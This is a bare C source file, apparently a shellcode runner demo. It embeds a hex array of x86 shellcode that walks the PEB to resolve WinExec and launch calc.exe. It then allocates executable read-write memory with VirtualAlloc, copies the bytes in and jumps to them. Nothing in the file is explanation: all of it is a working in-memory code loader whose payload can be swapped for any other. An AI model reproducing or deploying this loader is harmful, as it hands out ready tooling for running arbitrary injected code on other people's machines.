// compile : gcc -o shellcode_runner.exe shellcode_runner.c

#include <windows.h>

unsigned char shellcode[] = {
    0x64, 0xa1, 0x30, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x78, 0x8b, 0x44, 0x24, 0x78, 0x83, 0xc0, 0x0c, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x74, 0x8b, 0x44, 0x24, 0x74, 0x83, 0xc0, 0x14, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x70, 0x8b, 0x44, 0x24, 0x70, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x6c, 0x8b, 0x44, 0x24, 0x6c, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x68, 0x8b, 0x44, 0x24, 0x68, 0x83, 0xc0, 0x10, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x64, 0x8b, 0x44, 0x24, 0x64, 0x8b, 0x40, 0x3c, 0x89, 0x44, 0x24, 0x60, 0x8b, 0x54, 0x24, 0x60, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x5c, 0x8b, 0x44, 0x24, 0x5c, 0x8b, 0x40, 0x78, 0x89, 0x44, 0x24, 0x58, 0x8b, 0x54, 0x24, 0x58, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x54, 0x8b, 0x44, 0x24, 0x54, 0x83, 0xc0, 0x1c, 0x8b, 0x00, 0x89, 0xc2, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x50, 0x8b, 0x44, 0x24, 0x54, 0x83, 0xc0, 0x20, 0x8b, 0x00, 0x89, 0xc2, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x4c, 0x8b, 0x44, 0x24, 0x54, 0x83, 0xc0, 0x24, 0x8b, 0x00, 0x89, 0xc2, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x48, 0xc7, 0x44, 0x24, 0x7c, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x28, 0x57, 0x69, 0x6e, 0x45, 0xc7, 0x44, 0x24, 0x2c, 0x78, 0x65, 0x63, 0x00, 0x8b, 0x44, 0x24, 0x7c, 0x8d, 0x14, 0x85, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x4c, 0x01, 0xd0, 0x8b, 0x00, 0x89, 0xc2, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x44, 0x8b, 0x44, 0x24, 0x44, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x28, 0x38, 0xc2, 0x75, 0x72, 0x8b, 0x44, 0x24, 0x44, 0x83, 0xc0, 0x01, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x29, 0x38, 0xc2, 0x75, 0x5f, 0x8b, 0x44, 0x24, 0x44, 0x83, 0xc0, 0x02, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x2a, 0x38, 0xc2, 0x75, 0x4c, 0x8b, 0x44, 0x24, 0x44, 0x83, 0xc0, 0x03, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x2b, 0x38, 0xc2, 0x75, 0x39, 0x8b, 0x44, 0x24, 0x44, 0x83, 0xc0, 0x04, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x2c, 0x38, 0xc2, 0x75, 0x26, 0x8b, 0x44, 0x24, 0x44, 0x83, 0xc0, 0x05, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x2d, 0x38, 0xc2, 0x75, 0x13, 0x8b, 0x44, 0x24, 0x44, 0x83, 0xc0, 0x06, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x2e, 0x38, 0xc2, 0x74, 0x0a, 0x83, 0x44, 0x24, 0x7c, 0x01, 0xe9, 0x55, 0xff, 0xff, 0xff, 0x90, 0x8b, 0x44, 0x24, 0x7c, 0x89, 0x44, 0x24, 0x40, 0x8b, 0x44, 0x24, 0x40, 0x8d, 0x14, 0x00, 0x8b, 0x44, 0x24, 0x48, 0x01, 0xd0, 0x0f, 0xb7, 0x00, 0x66, 0x89, 0x44, 0x24, 0x3e, 0x0f, 0xbf, 0x44, 0x24, 0x3e, 0x8d, 0x14, 0x85, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x50, 0x01, 0xd0, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x38, 0x8b, 0x54, 0x24, 0x38, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x34, 0xc7, 0x44, 0x24, 0x1f, 0x63, 0x61, 0x6c, 0x63, 0xc7, 0x44, 0x24, 0x23, 0x2e, 0x65, 0x78, 0x65, 0xc6, 0x44, 0x24, 0x27, 0x00, 0x8b, 0x44, 0x24, 0x34, 0x89, 0x44, 0x24, 0x30, 0xc7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, 0x1f, 0x89, 0x04, 0x24, 0x8b, 0x44, 0x24, 0x30, 0xff, 0xd0
};

int main() {
    void* exec_mem = VirtualAlloc(
        NULL,                          
        sizeof(shellcode),             
        MEM_COMMIT | MEM_RESERVE,      
        PAGE_EXECUTE_READWRITE         
    );

    memcpy(exec_mem, shellcode, sizeof(shellcode));

    ((void(*)())exec_mem)();

    return 0;
}